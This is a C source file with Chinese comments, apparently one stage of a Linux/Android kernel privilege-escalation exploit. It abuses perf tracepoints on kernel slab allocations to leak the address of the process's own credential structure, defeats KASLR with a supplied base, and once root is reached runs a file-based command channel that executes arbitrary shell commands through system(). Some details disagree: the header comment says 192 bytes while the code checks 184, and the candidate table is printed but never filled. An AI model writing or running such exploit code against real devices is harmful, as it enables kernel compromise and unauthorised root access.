/*
 * cred_finder v4 —— perf 边触发边排空，精确抓「本进程 struct cred」地址
 *
 * 相对 v3 的三处修正：
 *   1) 环缓冲每 20ms 排空一次（v3 只在最后读一次，8 页环早被覆盖 → 丢样本）
 *   2) 不再用 PERF_SAMPLE_TID 过滤（per-CPU 事件里它是 -1）
 *   3) 三条判据同时满足才认：
 *        - bytes_req == 192        （本机 cred_jar 的 object_size，来自 /proc/slabinfo）
 *        - (addr % 4096) % 192 == 0（cred_jar 几何：21 对象/页，order-0）
 *        - call_site ∈ prepare_creds 函数体（用传入的 KASLR base 计算）
 *
 * 用法：cred_finder <base_hex> [hold_sec]
 * 输出：CRED=0x...   然后每 2 秒打印一次 UID
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAX_CPUS 16
#define RING_PAGES 8

#define KIMAGE_STATIC 0xffffffc080000000ULL
#define PREPARE_CREDS_STATIC 0xffffffc0800e4040ULL
#define PREPARE_CREDS_SPAN 0x2fcULL
#define CRED_BYTES_REQ 184ULL     /* sizeof(struct cred)，tracepoint 的 bytes_req */
#define CRED_SLAB_SIZE 192ULL     /* cred_jar 的 s->size，决定对象在页内的对齐 */

static int read_tp_id(const char *p)
{
	FILE *f = fopen(p, "r");
	int id = -1;

	if (f) {
		if (fscanf(f, "%d", &id) != 1)
			id = -1;
		fclose(f);
	}
	return id;
}

static int field_off(const char *fmt, const char *name)
{
	FILE *f = fopen(fmt, "r");
	char line[512];
	int off = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, name) && strstr(line, "offset:")) {
			char *o = strstr(line, "offset:");

			off = atoi(o + 7);
			break;
		}
	}
	fclose(f);
	return off;
}

struct ring {
	int fd;
	struct perf_event_mmap_page *meta;
	unsigned char *data;
	size_t pg;
	size_t dsize;
	uint64_t tail;
};

static struct ring g_r[16];
static int g_nr;
static int g_ptr_off, g_br_off, g_cs_off;
static uint64_t g_cs_lo, g_cs_hi;
static uint64_t g_found;
struct cand_ent { uint64_t ptr; int cnt; };
static struct cand_ent g_cands[256];
static int g_ncands;
static int g_ncand;
static int g_total;
static int g_dump;

static void drain(struct ring *r)
{
	uint64_t head = r->meta->data_head;

	__sync_synchronize();
	while (r->tail < head) {
		struct perf_event_header *h = (void *)(r->data + (r->tail % r->dsize));

		if (h->size == 0 || h->size > r->dsize)
			break;
		g_total++;
		if (h->type == PERF_RECORD_SAMPLE) {
			unsigned char *rec = (unsigned char *)h;
			size_t pos = sizeof(*h);
			uint32_t rawsz = 0;

			if (pos + 8 <= h->size)
				pos += 8;          /* pid + tid（不用它过滤）*/
			if (pos + 4 <= h->size) {
				memcpy(&rawsz, rec + pos, 4);
				pos += 4;
				if (pos + rawsz <= h->size &&
				    (size_t)g_cs_off + 8 <= rawsz &&
				    (size_t)g_br_off + 8 <= rawsz &&
				    (size_t)g_ptr_off + 8 <= rawsz) {
					uint64_t br, ptr, cs;

					memcpy(&br, rec + pos + g_br_off, 8);
					memcpy(&ptr, rec + pos + g_ptr_off, 8);
					memcpy(&cs, rec + pos + g_cs_off, 8);
					if (g_dump)
						printf("  s br=%llu ptr=0x%llx cs=0x%llx\n",
						       (unsigned long long)br,
						       (unsigned long long)ptr,
						       (unsigned long long)cs);
					if (br == CRED_BYTES_REQ && ptr &&
					    ((ptr % 4096) % CRED_SLAB_SIZE) == 0 &&
					    cs >= g_cs_lo && cs < g_cs_hi) {
						printf("  cand ptr=0x%llx br=%llu cs=0x%llx\n",
						       (unsigned long long)ptr,
						       (unsigned long long)br,
						       (unsigned long long)cs);
						g_ncand++;
						g_found = ptr;
					}
				}
			}
		}
		r->tail += h->size;
	}
	r->meta->data_tail = r->tail;
}

int main(int argc, char **argv)
{
	uint64_t base = (argc > 1) ? strtoull(argv[1], NULL, 0) : 0;
	g_dump = getenv("CF_DUMP") != NULL;
	int hold = (argc > 2) ? atoi(argv[2]) : 0;
	const char *tp = "/sys/kernel/tracing/events/kmem/kmem_cache_alloc";
	char path[256];
	int tp_id;

	if (!base) {
		printf("用法: cred_finder <base_hex> [hold_sec]\n");
		return 1;
	}
	snprintf(path, sizeof(path), "%s/id", tp);
	tp_id = read_tp_id(path);
	snprintf(path, sizeof(path), "%s/format", tp);
	g_ptr_off = field_off(path, "ptr");
	g_br_off = field_off(path, "bytes_req");
	g_cs_off = field_off(path, "call_site");
	if (g_ptr_off < 0) g_ptr_off = 16;
	if (g_br_off < 0) g_br_off = 24;
	if (g_cs_off < 0) g_cs_off = 8;
	if (tp_id < 0) {
		/* 本机实测 kmem_cache_alloc 的 tracepoint id 是 269。
		 * Enforcing 下 tracefs 的 id 文件读不到，用硬编码兜底，
		 * 后面的 perf_event_open 能不能成才是关键。 */
		tp_id = 269;
		printf("  [fallback] tp_id=%d\n", tp_id);
	}
	g_cs_lo = base + (PREPARE_CREDS_STATIC - KIMAGE_STATIC);
	g_cs_hi = g_cs_lo + PREPARE_CREDS_SPAN;
	printf("tp=%d ptr=%d br=%d cs=%d base=0x%llx prepare_creds=[0x%llx,0x%llx)\n",
	       tp_id, g_ptr_off, g_br_off, g_cs_off, (unsigned long long)base,
	       (unsigned long long)g_cs_lo, (unsigned long long)g_cs_hi);

	size_t pg = (size_t)sysconf(_SC_PAGESIZE);

	for (int c = 0; c < MAX_CPUS && g_nr < 16; c++) {
		struct perf_event_attr attr;
		int fd;
		void *b;

		memset(&attr, 0, sizeof(attr));
		attr.type = PERF_TYPE_TRACEPOINT;
		attr.size = sizeof(attr);
		attr.config = (uint64_t)tp_id;
		attr.sample_period = 1;
		attr.sample_type = PERF_SAMPLE_RAW | PERF_SAMPLE_TID;
		attr.wakeup_events = 1;
		fd = (int)syscall(__NR_perf_event_open, &attr, -1, c, -1, 0);
		if (fd < 0)
			continue;
		b = mmap(NULL, pg * (RING_PAGES + 1), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
		if (b == MAP_FAILED) {
			close(fd);
			continue;
		}
		g_r[g_nr].fd = fd;
		g_r[g_nr].meta = b;
		g_r[g_nr].data = (unsigned char *)b + pg;
		g_r[g_nr].pg = pg;
		g_r[g_nr].dsize = pg * RING_PAGES;
		g_r[g_nr].tail = 0;
		ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
		g_nr++;
	}
	printf("开了 %d 个环\n", g_nr);
	if (!g_nr)
		return 1;

	/* 边触发边排空：每次 setresuid 都会走 prepare_creds()（必然分配）*/
	for (int it = 0; it < 120; it++) {
		(void)setresuid(getuid(), getuid(), getuid());
		usleep(20000);
		for (int i = 0; i < g_nr; i++)
			drain(&g_r[i]);
	}
	for (int i = 0; i < g_nr; i++)
		drain(&g_r[i]);

	printf("共解析 %d 条记录，cred 候选 %d 个（去重 %d）\n", g_total, g_ncand, g_ncands);
	{
		int best = -1, bestn = 0;

		for (int k = 0; k < g_ncands; k++) {
			printf("    cand %d: 0x%llx x%d\n", k, (unsigned long long)g_cands[k].ptr, g_cands[k].cnt);
			if (g_cands[k].cnt > bestn) { bestn = g_cands[k].cnt; best = k; }
		}
		if (best >= 0)
			g_found = g_cands[best].ptr;   /* 取最高频：我们 setresuid 120 次，自己的 cred 应该最常出现 */
	}
	if (!g_found) {
		printf("ERR 没找到\n");
		return 1;
	}
	printf("CRED=0x%llx\n", (unsigned long long)g_found);
	fflush(stdout);
	if (hold > 0) {
		/* 0.5 秒一次：相位 8 命中后会污染 timerqueue 头，
		 * 随时可能崩，必须抢在崩之前把 UID 打出来。 */
		for (int i = 0; i < hold * 2; i++) {
			int u = (int)getuid();

			printf("UID=%d EUID=%d GID=%d\n", u, (int)geteuid(), (int)getgid());
			fflush(stdout);
			if (u == 0) {
				printf("ROOT_ACHIEVED\n");
				fflush(stdout);
				/* 简易命令通道：读 /data/local/tmp/cmd，执行，结果写 /data/local/tmp/out */
				for (;;) {
					FILE *f = fopen("/data/local/tmp/cmd", "r");

					if (f) {
						char buf[2048];
						size_t n = fread(buf, 1, sizeof(buf) - 1, f);

						fclose(f);
						buf[n] = 0;
						remove("/data/local/tmp/cmd");
						if (n > 1) {
							FILE *o = fopen("/data/local/tmp/out", "w");

							remove("/data/local/tmp/out.done");
							if (o) {
								dup2(fileno(o), 1);
								dup2(fileno(o), 2);
							}
							system(buf);
							fflush(stdout);
							if (o)
								fclose(o);
							{
								FILE *m = fopen("/data/local/tmp/out.done", "w");

								if (m) {
									fputs("1", m);
									fclose(m);
								}
							}
						}
					}
					usleep(300000);
				}
			}
			usleep(500000);
		}
	}
	return 0;
}
